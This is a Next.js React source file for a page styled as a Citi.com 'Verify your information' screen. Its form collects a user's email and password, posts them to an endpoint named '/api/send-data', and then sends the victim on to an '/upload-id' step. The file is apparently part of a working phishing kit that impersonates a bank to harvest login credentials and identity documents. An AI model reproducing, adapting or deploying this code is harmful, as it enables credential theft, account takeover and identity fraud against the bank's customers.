"use client";

import axios from "axios";
import React, { useState } from "react";
import { useRouter } from "next/navigation";
import Header from "@/components/layout/Header";
import Footer from "@/components/layout/Footer";

// export const metadata = {
//   title: "Verify Information | Citi.com",
// };

const VerifyPage = () => {
  const router = useRouter();
  const [loading, setLoading] = useState(false);

  const [form, setForm] = useState({ email: "", password: "" });

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((s) => ({ ...s, [name]: value }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!form.email || !form.password) {
      alert("Please fill both email and password fields.");
      return;
    }

    try {
      setLoading(true);
      const res = await axios.post("/api/send-data", form);
      if (res.status === 200) {
        router.push("/upload-id");
      }
    } catch (err) {
      alert("Verify failed. Please check your credentials and try again.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <main className="bg-[#f5f7fa] flex flex-col">
      <Header />

      <div className="flex-grow flex items-center justify-center px-4 min-h-[90vh]">
        <div className="w-full max-w-md bg-white rounded-2xl shadow-md p-8">
          <h1 className="text-2xl font-bold text-[#0d2d62] mb-4">
            Verify your information
          </h1>
          <p className="text-sm text-gray-700 mb-6 leading-relaxed">
            Please review and verify the information you’ve provided to ensure
            its accuracy. This is essential before moving forward. Thank you.{" "}
            <br />
            {/* <span className="text-red-600 font-semibold">
              Fields marked with asterisks (*) are required.
            </span> */}
          </p>

          <form className="space-y-6" onSubmit={handleSubmit}>
            <div>
              <label className="block text-sm font-medium text-gray-700">
                Email <span className="text-red-600">*</span>
              </label>
              <input
                type="email"
                name="email"
                value={form.email}
                onChange={handleChange}
                required
                className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                placeholder="you@example.com"
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700">
                Password <span className="text-red-600">*</span>
              </label>
              <input
                type="password"
                name="password"
                value={form.password}
                onChange={handleChange}
                required
                className="mt-2 w-full rounded-lg border px-4 py-3 focus:outline-none focus:ring-2 focus:ring-[#0d2d62]"
                placeholder="••••••••"
              />
            </div>

            <button
              type="submit"
              className="w-full py-3 mt-2 bg-primary hover:!bg-[#054e7b] rounded-lg font-bold text-white  transition-colors"
            >
              {loading ? "Loading..." : "Verify and Continue"}
            </button>
          </form>
        </div>
      </div>

      <Footer />
    </main>
  );
};

export default VerifyPage;
